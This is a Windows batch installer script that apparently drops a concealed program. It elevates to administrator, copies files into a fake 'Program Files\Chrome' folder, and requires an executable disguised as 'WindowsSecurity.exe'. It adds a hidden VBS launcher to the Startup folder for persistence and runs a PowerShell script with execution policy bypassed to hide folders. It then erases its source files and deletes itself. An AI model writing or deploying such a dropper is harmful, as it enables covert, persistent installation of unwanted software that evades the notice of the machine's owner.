@echo off
:: Check for Admin privileges
>nul 2>&1 net session
if %errorLevel% neq 0 (
    echo Requesting Administrator permissions...
    powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs" 2>nul
    exit /b
)

setlocal enabledelayedexpansion

:: Get the folder where this script is located
set "sourceFolder=%~dp0"
set "targetFolder=C:\Program Files\Chrome"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

echo Creating target folder if it does not exist...
if not exist "%targetFolder%" mkdir "%targetFolder%" 2>nul || (
    echo ERROR: Failed to create %targetFolder%!
    pause
    exit /b 1
)

:: Copy only the files that exist in the same directory as the script
echo Copying files to %targetFolder%...
for %%F in ("%sourceFolder%\*") do (
    if /I not "%%~nxF"=="setup.bat" (
        copy /Y "%%F" "%targetFolder%" >nul 2>&1 && (
            echo Copied %%~nxF to %targetFolder%
        ) || (
            echo ERROR: Failed to copy %%~nxF!
            pause
            exit /b 1
        )
    )
)

:: Ensure WindowsSecurity.exe was copied
if not exist "%targetFolder%\WindowsSecurity.exe" (
    echo ERROR: WindowsSecurity.exe was NOT found or not copied to %targetFolder%!
    pause
    exit /b 1
)

:: Copy run_hidden.vbs to the Startup folder
echo Copying startup script...
if exist "%sourceFolder%\run_hidden.vbs" (
    copy /Y "%sourceFolder%\run_hidden.vbs" "%startupFolder%\run_hidden.vbs" >nul 2>&1 && (
        echo Copied run_hidden.vbs to Startup folder.
    ) || (
        echo ERROR: Failed to copy run_hidden.vbs!
        pause
        exit /b 1
    )
) else (
    echo ERROR: run_hidden.vbs not found in source folder!
    pause
    exit /b 1
)

:: Verify if files exist before proceeding
if not exist "%startupFolder%\run_hidden.vbs" (
    echo ERROR: run_hidden.vbs was NOT copied to Startup folder!
    pause
    exit /b 1
)

:: Now run the PowerShell script to hide files
echo Running PowerShell script to hide folders...
powershell -ExecutionPolicy Bypass -File "C:\Program Files\Chrome\hide_folder.ps1"

:: Run the hidden VBS script immediately to start the service
echo Starting WindowsSecurity service via run_hidden.vbs...
start "" wscript.exe "%startupFolder%\run_hidden.vbs" //B //Nologo

:: Wait before cleaning up to ensure file operations complete
timeout /t 2 /nobreak >nul

:: Delete original files after verification
echo Cleaning up...
for %%F in ("%sourceFolder%\*") do (
    if /I not "%%~nxF"=="setup.bat" (
        del /F /Q "%%F" >nul 2>&1 && echo Deleted %%~nxF
    )
)

:: Schedule the self-delete of setup.bat
echo Installation complete! WindowsSecurity is now running.
ping -n 3 127.0.0.1 >nul 2>&1
(
  echo @echo off
  echo :checkFile
  echo if exist "%~f0" ^(
  echo   del /F /Q "%~f0"
  echo   if exist "%~f0" ^(
  echo     ping -n 2 127.0.0.1 ^>nul
  echo     goto checkFile
  echo   ^)
  echo ^)
  echo del /F /Q "%%0"
) > "%temp%\cleanup.bat"
start "" /b "%temp%\cleanup.bat" >nul 2>&1

exit